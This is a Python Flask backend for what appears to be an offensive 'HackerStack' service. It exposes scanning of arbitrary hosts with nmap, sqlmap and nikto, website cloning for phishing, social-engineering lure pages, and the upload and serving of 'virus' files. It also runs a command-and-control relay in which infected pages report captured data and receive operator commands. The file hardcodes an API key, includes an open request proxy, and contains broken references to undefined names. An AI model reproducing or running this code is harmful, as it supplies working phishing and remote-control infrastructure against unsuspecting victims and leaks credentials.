
import os
from flask import Flask,request , Response, send_file
from flask_cors import CORS
import requests
import random
import string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import mimetypes
import threading
import time
from urllib.parse import unquote
import qrcode
import json
import whois
from zhipuai import ZhipuAI
import yagmail




import NmapScaner as NmapScaner
import config_loader as config_loader
import SqlMapScaner as SqlMapScaner
import dns_searcher as dns_searcher
import NiktoScaner as NiktoScaner
import the_matrix as matrix



app = Flask(__name__)
CORS(app)

user_server = 'https://user.hackerstack.top'
mail_server = 'https://send.linwinsoft.top'
url_list = {}
config: config_loader = None
visit_request = {}
ip_proxy = {}
client = ZhipuAI(api_key="b8487357fcb60284daa628fd8746d8b1.0wahvm5rmBqfFJzq") 



class user_sessen():
    username: str = ''
    url: str = ''
    attack_type: str = ''
    message ='none'
    url_clone: str = ''
    attack_command: str = ''

def get_random() -> str:
    # 定义可用的字符集，包括26个英文字母（大小写）和数字
    characters = string.ascii_letters + string.digits
    # 生成一个10个字符长度的随机字符串
    random_string = ''.join(random.choice(characters) for _ in range(10))
    if random_string in url_list.keys():
        return get_random()
    else:
        return random_string

@app.route("/game_mail/<path:link>")
def game_mail(link):
    print(1)
    try:
        token = str(link)[str(link).rfind("/")+1 : len(link)]
        print(token)
        print(url_list)
        time.sleep(10)
        url_list.get(token).message = "用户: 1145141919 , 密码: a114loveyou"
        return '发送钓鱼邮件成功 ,你的确认操作秘钥复制: sdf890324j3j24900i123jkl1nj23lkhjrsoidujfpoojq23'
    except:
        return '输入的链接错误'

@app.route("/get_my_ip")
def get_my_ip():
    return request.remote_addr

@app.route("/cors_requests" , methods=['POST','GET'])
def cors_requests():
    json_obj = json.loads(request.get_data().decode('utf-8'))
    target = json_obj['target']
    method = json_obj['method']
    data = json_obj['data']
    return requests.request(method, target, data=data).content.decode('utf-8')

@app.route("/send_mail/<user>/<pwd>" , methods=['POST'])
def send_mail(user , pwd):

    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if json.loads(r.text)['message'] == 'login successful.':
        pass
    else:
        return '登录错误'

    json_obj = json.loads(request.get_data().decode('utf-8'))
    return requests.post(mail_server+'/send_mail' , data=json.dumps(json_obj))


@app.route("/bug_search/<check>/<path:website>")
def bug_search(check , website ):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] > 2:
            return 'Too many requests, Max: 2'
    else:
        visit_request[client_ip] = 1

    r = requests.post(user_server+'/check_ip_check/'+check)
    if json.loads(r.text)['message'] == 'ok':
        return NiktoScaner.CommandNikto(website)
    else:
        return '验证码错误'

@app.route("/create_db/<user>/<pwd>")
def create_db(user , pwd):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] > 5:
            return 'Too many requests, Max: 5'
        
    else:
        visit_request[client_ip] = 1

    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if r.text != 'Passwd Or UserName Error!':
        # 创建目录 /usr/metalite-server/database/<user>/<pwd>
        if os.path.exists('/usr/metalite-server/database/'+user+'/'+pwd):
            return 'ok'
        else:
            os.makedirs('/usr/metalite-server/database/'+user+'/'+pwd)
            # 新建文件 /usr/metalite-server/database/<user>/info.jmap
            # 写入内容 name=root\nmax_size=
            with open('/usr/metalite-server/database/'+user+'/'+pwd+'/info.jmap' , 'w') as f:
                f.write('name='+user+'\nmax_size=157286400')
        return 'ok'
    else:
        return '登录错误'


@app.route("/ok_game/<user>/<pwd>/<level>")
def ok_game(user , pwd , level):
    level = int(level)
    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if r.text != 'Passwd Or UserName Error!':
        if (level >= 7):
            return 'ok 1'
        else:
            j = json.loads(open('./the-matrix/'+user+".json" , 'r').read())
            j['level'] = level+1
            with open('./the-matrix/'+user+".json" , 'w') as f:
                f.write(json.dumps(j))
            return 'ok 2'
    else:
        return '登录错误'

@app.route('/game_level_info/<level>')
def game_level_info(level):
    try:
        return '{"title" : "'+matrix.game_title[int(level)]+'" , "info" : "'+matrix.game_info[int(level)]+'" , "story" : "'+matrix.game_stroy[int(level)]+'"}'
    except BaseException as e: 
        print(e)
        return '错误'

@app.route('/game_level/<user>/<pwd>')
def get_game_level(user , pwd):
    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if r.text != 'Passwd Or UserName Error!':
        try:
            return str(json.loads(open('./the-matrix/'+user+'.json' , 'r').read())['level'])
        except:
            with open('./the-matrix/'+user+'.json' , 'w') as f:
                j = {
                    "level" : 0,
                    "isvip" : False
                }
                f.write(json.dumps(j))
            return "1"
    else:
        return '登录错误'
    
@app.route('/subdomain/<website>/')
def subdomain_searcher(website):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] > 5:
            return 'Too many requests, Max: 5'
    else:
        visit_request[client_ip] = 1
    return dns_searcher.get_subdomain(website=website)

@app.route('/get_ip_location/<ip>' , methods=['POST' , 'GET'])
def get_ip_location(ip):
    r = requests.get('http://ip-api.com/json/'+ip)
    return r.text

@app.route('/dns_search/<website>/')
def dns_search(website):
    return dns_searcher.get_dns(website)

@app.route('/sqlmap/' , methods=['POST'])
def sqlmap_scan():
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] > 2:
            return 'Too many requests, Max: 2'
    else:
        visit_request[client_ip] = 1

    json_obj = json.loads(request.get_data().decode('utf-8'))
    host = json_obj['command_values']
    check = json_obj['check']

    r = requests.post(user_server+'/check_ip_check/'+check)
    if json.loads(r.text)['message'] == 'ok':
        return json.dumps({"message" : SqlMapScaner.CommandSqlMap(host)})
    else:
        return json.dumps({"message" : "验证码错误"})

@app.route('/nmap/' , methods=['POST'])
def nmap_scan():
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] > 2:
            return 'Too many requests, Max: 2'
    else:
        visit_request[client_ip] = 1
    
    json_obj = json.loads(request.get_data().decode('utf-8'))
    host = json_obj['command_values']
    check_code = json_obj['check']

    try:
        if host == '127.0.0.1' or host == '0.0.0.0':
            return json.dumps({'message': 'error'})
        r = requests.post(user_server+'/check_ip_check/'+check_code)
        if json.loads(r.text)['message'] == 'ok':
            return json.dumps({"message" : NmapScaner.CommandNmap(host)})
        else:
            return json.dumps({"message" : "验证码错误"})
    except BaseException as e:
        print(e)
        return json.dumps({"message" : "error"})

@app.route('/whois/' , methods=['POST'])
def whois_show():
    website = json.loads(request.get_data().decode('utf-8'))['website']
    w = whois.whois(str(website))
    return w
        
@app.route('/create_web_virus/' , methods=['GET','POST'])
def create_web_virus():
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    json_obj = json.loads(request.get_data().decode('utf-8'))
    user = json_obj['user']
    pwd = json_obj['pwd']

    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if r.text != 'Passwd Or UserName Error!':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = 'web_virus'
        u.username = user
        u.url_clone = attack_url

        url_list[n] = u
        return n

    else:
        return 'your message error' 
    
@app.route('/create_virus/' , methods=['GET'])
def create_virus():
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    json_obj = json.loads(request.get_data().decode('utf-8'))
    user = json_obj['user']
    pwd = json_obj['pwd']

    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if json.loads(r.text)['message'] == 'login successfull.':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = type
        u.username = user
        u.url_clone = attack_url

        url_list[n] = u
        return n

    else:
        return 'your message error' 

@app.route('/qr_code' , methods=['POST'])
def make_qr_code():
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 9:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1
        
    data = request.get_data().decode('utf-8').strip()
    img_file = r'qrcode/'+ get_random()+".png"
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=10,
        border=4
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image()
    img.save(img_file)
    img.show()
    file_name = img_file
    return send_file(file_name, as_attachment=True)

@app.route('/get_virus/<file_name>')
def get_virus(file_name):
    if "../" in str(file_name) or str(file_name).startswith('/'):
        return 'not allow.'
    return send_file("../virus/"+file_name, as_attachment=True)

@app.route('/virus_clear_command/<attack_url>/' , methods=['GET','POST'])
def clear_token_command(attack_url):
    if attack_url in url_list.keys():
        if url_list.get(attack_url).attack_type == 'web_virus':
            url_list.get(attack_url).attack_command = "none"
            return 'ok'
        else:
            return 'your message error'

    else:
        return 'your message error'

@app.route('/push/<attack_url>/' , methods=['POST' , 'GET'])
def get_message(attack_url):
    message = json.loads(request.get_data().decode('utf-8'))['content']

    if attack_url in url_list.keys():
        if url_list.get(attack_url).attack_type == 'web_virus':
            url_list.get(attack_url).message = unquote(message)
            send_command = url_list.get(attack_url).attack_command
            return send_command

        url_list.get(attack_url).message = unquote(message)
        return 'ok'

    else:
        return 'your message error'
    
@app.route('/push_bin/<attack_url>' , methods=['POST' , 'GET'])
def push_bin(attack_url):
    data = request.get_data()

    if attack_url in url_list.keys():
        if url_list.get(attack_url).attack_type == 'web_virus':
            print("11: "+url_list.get(attack_url).attack_command)
            url_list.get(attack_url).message = data
            return url_list.get(attack_url).attack_command

        url_list.get(attack_url).message = data
        return 'ok'

    else:
        return 'your message error'

@app.route('/get_virus_list')
def get_virus_list():
    list_file = os.listdir('virus/')
    return json.dumps(list_file)

@app.route('/update_virus/<filename>/<check>' , methods=['POST'])
def update_virus(filename , check):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 3:
            return json.dumps({'message': 'Too many requests'})
    else:
        visit_request[client_ip] = 1
    message = str(json.loads(requests.get(user_server+'/check_ip_check/' + check).text.strip())['message'])
    print(message)
    if str(filename).strip().lower() == "index.html" or str(filename).strip().lower() == "index.htm":
        return json.dumps({'message': 'not allow.'})
    if message.strip() != 'ok':
        return json.dumps({'message': 'check code error.'})

    current_time = time.time()  # 获取当前时间戳
    local_time = time.localtime(current_time)  # 将时间戳转换为本地时间
    formatted_time = time.strftime("%Y%m%d%H%M%S", local_time)  # 格式化时间

    data = request.get_data()
    if len(data) > 1024 * 1024 * 5:
        return 'MAX UPDATE: 5MB.'

    with open('virus/' + formatted_time+"-"+filename , "wb") as f:
        f.write(data)
    return json.dumps({'message': 'ok'})

@app.route('/run/<token>/')
def xhr_run(token):
    attack_url = token
    if attack_url in url_list.keys():
        u: user_sessen = url_list.get(attack_url)
        if u.attack_type == 'VideoVirus':
            message_to_return = u.message
        else:
            # 返回u.message的值
            message_to_return = u.message
            # 更新u.message为'none'
            u.message = 'none'
            # 返回之前存储的消息
        return message_to_return
    else:
        return 'none'
    
@app.route('/virus_run/<attack_url>/' , methods=['POST' , 'GET'])
def virus_run(attack_url):
    command = json.loads(request.get_data().decode('utf-8'))['command']
    if attack_url in url_list.keys():
        print("ufdlkaslkfjdlkfjljflkdsjdf")
        u: user_sessen = url_list.get(attack_url)
        # 返回u.message的值
        message_to_return = u.message
        u.attack_command = command
        # 返回之前存储的消息
        return message_to_return
    else:
        return 'none'
    
@app.route('/resource/<path:url>') 
def get_resource(url):

    full_url = 'resource/' + str(url)
    r = Response()
    r.data = open(full_url , 'rb').read()
    (content_type, encoding) = mimetypes.guess_type(full_url)
    r.headers['Content-Type'] = content_type
    
    return r

@app.route('/w/<attack_token>/<path:url>')
def web_clone_url(attack_token,url):
    if attack_token in url_list.keys():
        u: user_sessen = url_list.get(attack_url)

        r = requests.get(u.url_clone+"/"+url)
        return r.content
    else:
        return 'send message error'

@app.route('/WebClone/<attack_url>/<user>/<pwd>')
def WebClone(attack_url , user , pwd):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    attack_url = str(attack_url).replace('-' , '/')

    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if r.text != 'Passwd Or UserName Error!':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = 'webclone'
        u.username = user
        u.url_clone = attack_url

        url_list[n] = u
        return n

    else:
        return 'your message error' 


@app.route('/api/<attack_type>/<user>/<pwd>/' , methods=['POST' , 'GET'])
def attack(attack_type,user,pwd):
    # 限制每个IP对制定api的访问.
    client_ip = request.remote_addr
    if client_ip in visit_request:
        visit_request[client_ip] = visit_request[client_ip] + 1
        if visit_request[client_ip] >= 6:
            return 'Too many requests'
    else:
        visit_request[client_ip] = 1

    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
    if r.text.lower() != 'login successfull.':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = attack_type
        u.username = user

        url_list[n] = u
        print(url_list)
        return n

    else:
        return 'your message error'

@app.route('/<path:attack_url>')
def attack_url(attack_url):

    if attack_url in url_list.keys():
        u: user_sessen = url_list.get(attack_url)
        r = Response()
        try:
            if u.attack_type == 'web_virus':
                r.data = open('modules/web_virus/index.html').read()
            elif u.attack_type == 'web_virus_1':
                r.data = open('modules/web_virus/index_1.html').read()
            elif u.attack_type == 'VideoVirus':
                r.data = open('modules/VideoVirus/index.html').read()
            elif u.attack_type == 'VirusInfoGetter':
                r.data = open('modules/VirusInfoGetter/index.html').read()
            else:
                # print('modules/socialEngine/'+u.attack_type+"/index.html")
                # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
                r.data = open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read()
            return r
        except:
            return 'the server error'
                
    else:
        print(attack_url)
        print(url_list)
        return 'your message error'

def visit_request_threading() -> None:
    while True:
        time.sleep(60) # 休息 60 秒
        visit_request.clear()

if __name__ == '__main__':
    config = config_loader.HackerStack_Config()

    visit_request_thread = threading.Thread(target=visit_request_threading , name='visit_request')
    visit_request_thread.start()

    app.run(host='0.0.0.0',port=int(config.get(
        'server_port'
    )))
